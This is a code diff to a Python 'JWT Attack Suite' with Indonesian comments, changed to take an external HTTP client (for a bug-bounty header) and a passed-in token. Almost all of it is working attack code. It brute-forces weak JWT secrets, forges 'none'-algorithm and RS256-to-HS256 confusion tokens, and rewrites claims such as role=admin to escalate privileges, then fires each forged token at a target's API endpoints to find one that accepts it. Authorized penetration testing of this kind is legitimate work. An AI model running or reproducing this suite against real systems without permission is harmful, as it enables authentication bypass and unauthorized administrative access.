@@ -2,6 +2,9 @@
 """
 Module 3: JWT Attack Suite 
 Dengan konfigurasi token internal (hardcoded) untuk kemudahan penggunaan pribadi
+
+MODIFIED: Added external HTTPClient support for X-Bug-Bounty header
+MODIFIED: JWT token can be passed as parameter (no longer hardcoded)
 """
 
 import asyncio
@@ -17,22 +20,18 @@ from core.logger import Logger
 
 logger = Logger()
 
-# ============ KONFIGURASI TOKEN (EDIT SESUAI KEBUTUHAN ANDA) ============
-# TODO: Ganti dengan JWT token target Anda
-JWT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NSIsIm5hbWUiOiJ0ZXN0Iiwicm9sZSI6InVzZXIifQ.signature"
+# ============ KONFIGURASI TOKEN DEFAULT (EDIT SESUAI KEBUTUHAN ANDA) ============
+# Ganti dengan JWT token target Anda
+DEFAULT_JWT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NSIsIm5hbWUiOiJ0ZXN0Iiwicm9sZSI6InVzZXIifQ.signature"
 # =========================================================================
 
-# Bisa juga pakai multiple tokens untuk di-test sekaligus
-JWT_TOKENS = [
-    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NSIsIm5hbWUiOiJ0ZXN0Iiwicm9sZSI6InVzZXIifQ.signature",
-    # Tambahkan token lain di sini
-]
-
 class JWTAttack:
-    def __init__(self, target: str, threads: int = 30, timeout: int = 5):
+    def __init__(self, target: str, threads: int = 30, timeout: int = 5, client: HTTPClient = None, jwt_token: str = None):
         self.target = target.rstrip('/')
         self.threads = threads
         self.timeout = timeout
+        self.client = client  # External client with X-Bug-Bounty header
+        self.jwt_token = jwt_token or DEFAULT_JWT_TOKEN  # Allow external token
         self.findings: List[Dict] = []
         self.stats = {
             'tokens_tested': 0,
@@ -69,6 +68,13 @@ class JWTAttack:
             "/api/verify", "/api/validate", "/api/check",
             "/api/admin", "/api/dashboard", "/api/settings",
         ]
+    
+    async def _get_client(self):
+        """Get HTTP client - use external if available, otherwise create new"""
+        if self.client:
+            return self.client
+        else:
+            return HTTPClient(self.target, timeout=self.timeout, retries=1)
     
     def decode_jwt(self, token: str) -> Optional[Dict]:
         """Decode JWT tanpa verifikasi"""
@@ -137,6 +143,8 @@ class JWTAttack:
     
     async def test_weak_secret(self, endpoint: str, original_token: str, decoded: Dict) -> Optional[Dict]:
         """Test weak secrets"""
+        client = await self._get_client()
+        
         for secret in self.all_secrets:
             self.stats['tokens_tested'] += 1
             
@@ -147,9 +155,22 @@ class JWTAttack:
                 algorithm=decoded["header"].get("alg", "HS256")
             )
             
-            async with HTTPClient(self.target, timeout=self.timeout) as client:
+            if not hasattr(client, 'session') or client.session is None:
+                async with client as ctx_client:
+                    response = await ctx_client.get(f"{endpoint}?token={fake_token}")
+                    if response and response.status == 200:
+                        body = await response.text()
+                        if "error" not in body.lower() and "invalid" not in body.lower():
+                            self.stats['vulnerabilities_found'] += 1
+                            return {
+                                "vulnerable": True,
+                                "layer": "WEAK_SECRET",
+                                "confidence": 100,
+                                "secret_found": secret,
+                                "endpoint": endpoint
+                            }
+            else:
                 response = await client.get(f"{endpoint}?token={fake_token}")
-                
                 if response and response.status == 200:
                     body = await response.text()
                     if "error" not in body.lower() and "invalid" not in body.lower():
@@ -167,6 +188,8 @@ class JWTAttack:
     
     async def test_none_algorithm(self, endpoint: str, decoded: Dict) -> Optional[Dict]:
         """Test 'none' algorithm vulnerability"""
+        client = await self._get_client()
+        
         modified_payload = decoded["payload"].copy()
         modified_payload["admin"] = True
         modified_payload["role"] = "admin"
@@ -174,9 +197,20 @@ class JWTAttack:
         
         fake_token = self.create_none_algorithm_token(decoded["header"], modified_payload)
         
-        async with HTTPClient(self.target, timeout=self.timeout) as client:
+        if not hasattr(client, 'session') or client.session is None:
+            async with client as ctx_client:
+                response = await ctx_client.get(f"{endpoint}?token={fake_token}")
+                if response and response.status == 200:
+                    self.stats['vulnerabilities_found'] += 1
+                    return {
+                        "vulnerable": True,
+                        "layer": "NONE_ALGORITHM",
+                        "confidence": 100,
+                        "endpoint": endpoint,
+                        "details": "JWT with 'none' algorithm accepted"
+                    }
+        else:
             response = await client.get(f"{endpoint}?token={fake_token}")
-            
             if response and response.status == 200:
                 self.stats['vulnerabilities_found'] += 1
                 return {
@@ -190,6 +224,8 @@ class JWTAttack:
     
     async def test_algorithm_confusion(self, endpoint: str, original_token: str, decoded: Dict) -> Optional[Dict]:
         """Test RS256 to HS256 algorithm confusion"""
+        client = await self._get_client()
+        
         if decoded["header"].get("alg") != "RS256":
             return None
         
@@ -203,9 +239,20 @@ class JWTAttack:
             algorithm="HS256"
         )
         
-        async with HTTPClient(self.target, timeout=self.timeout) as client:
+        if not hasattr(client, 'session') or client.session is None:
+            async with client as ctx_client:
+                response = await ctx_client.get(f"{endpoint}?token={fake_token}")
+                if response and response.status == 200:
+                    self.stats['vulnerabilities_found'] += 1
+                    return {
+                        "vulnerable": True,
+                        "layer": "ALGORITHM_CONFUSION",
+                        "confidence": 100,
+                        "endpoint": endpoint,
+                        "details": "RS256 token accepted as HS256"
+                    }
+        else:
             response = await client.get(f"{endpoint}?token={fake_token}")
-            
             if response and response.status == 200:
                 self.stats['vulnerabilities_found'] += 1
                 return {
@@ -219,6 +266,8 @@ class JWTAttack:
     
     async def test_privilege_escalation(self, endpoint: str, decoded: Dict) -> Optional[Dict]:
         """Test privilege escalation via payload modification"""
+        client = await self._get_client()
+        
         escalation_fields = [
             ("role", "admin"),
             ("is_admin", True),
@@ -242,9 +291,23 @@ class JWTAttack:
                 algorithm=decoded["header"].get("alg", "HS256")
             )
             
-            async with HTTPClient(self.target, timeout=self.timeout) as client:
+            if not hasattr(client, 'session') or client.session is None:
+                async with client as ctx_client:
+                    response = await ctx_client.get(f"{endpoint}?token={fake_token}")
+                    if response and response.status == 200:
+                        body = await response.text()
+                        if any(word in body.lower() for word in ['admin', 'dashboard', 'settings']):
+                            self.stats['vulnerabilities_found'] += 1
+                            return {
+                                "vulnerable": True,
+                                "layer": "PRIVILEGE_ESCALATION",
+                                "confidence": 95,
+                                "endpoint": endpoint,
+                                "field_modified": field,
+                                "details": f"Privilege escalation via {field}={value}"
+                            }
+            else:
                 response = await client.get(f"{endpoint}?token={fake_token}")
-                
                 if response and response.status == 200:
                     body = await response.text()
                     if any(word in body.lower() for word in ['admin', 'dashboard', 'settings']):
@@ -259,8 +322,12 @@ class JWTAttack:
                         }
         return None
     
-    async def scan_token(self, token: str, endpoints: List[str] = None) -> Dict:
+    async def scan_token(self, token: str = None, endpoints: List[str] = None) -> Dict:
         """Full JWT attack scan on token"""
+        
+        # Use instance token if none provided
+        if token is None:
+            token = self.jwt_token
         
         if endpoints is None:
             endpoints = self.jwt_endpoints
@@ -292,22 +359,22 @@ class JWTAttack:
             result = await self.test_weak_secret(endpoint, token, decoded)
             if result:
                 self.findings.append(result)
-                logger.finding("WEAK SECRET", f"Secret found: {result.get('secret_found')}")
+                logger.info(f"[!] WEAK SECRET: {result.get('secret_found')}")
             
             result = await self.test_none_algorithm(endpoint, decoded)
             if result:
                 self.findings.append(result)
-                logger.finding("NONE ALGORITHM", "JWT accepted with 'none' algorithm")
+                logger.info("[!] NONE ALGORITHM: JWT accepted with 'none' algorithm")
             
             result = await self.test_algorithm_confusion(endpoint, token, decoded)
             if result:
                 self.findings.append(result)
-                logger.finding("ALGORITHM CONFUSION", "RS256 token accepted as HS256")
+                logger.info("[!] ALGORITHM CONFUSION: RS256 token accepted as HS256")
             
             result = await self.test_privilege_escalation(endpoint, decoded)
             if result:
                 self.findings.append(result)
-                logger.finding("PRIVILEGE ESCALATION", f"Modified field: {result.get('field_modified')}")
+                logger.info(f"[!] PRIVILEGE ESCALATION: Modified field: {result.get('field_modified')}")
             
             await asyncio.sleep(0.2)
         
@@ -344,21 +411,26 @@ class JWTAttack:
             "security_rating": rating,
             "findings": self.findings
         }
+
+
+# ================================================================
+# MAIN RUN FUNCTION - MODIFIED FOR EXTERNAL CLIENT AND TOKEN
+# ================================================================
+async def run(target: str, endpoints: List[str] = None, token: str = None, client: HTTPClient = None) -> Dict:
+    """
+    Run JWT attack suite
     
-    @staticmethod
-    async def run(target: str, endpoints: List[str] = None) -> Dict:
-        """
-        Run JWT attack suite dengan token internal
-        
-        Args:
-            target: Target URL
-            endpoints: Custom endpoints (optional)
-        """
-        scanner = JWTAttack(target)
-        
-        # Gunakan token dari konfigurasi di atas
-        token = JWT_TOKEN
-        
-        logger.info(f"Using configured JWT token: {token[:50]}...")
-        
-        return await scanner.scan_token(token, endpoints)
+    Args:
+        target: Target URL
+        endpoints: Custom endpoints (optional)
+        token: JWT token to test (optional, uses DEFAULT_JWT_TOKEN if not provided)
+        client: Optional external HTTPClient (for X-Bug-Bounty header)
+    """
+    scanner = JWTAttack(target, client=client, jwt_token=token)
+    
+    # Use provided token, otherwise use default
+    test_token = token or DEFAULT_JWT_TOKEN
+    
+    logger.info(f"Using JWT token: {test_token[:50]}...")
+    
+    return await scanner.scan_token(test_token, endpoints)
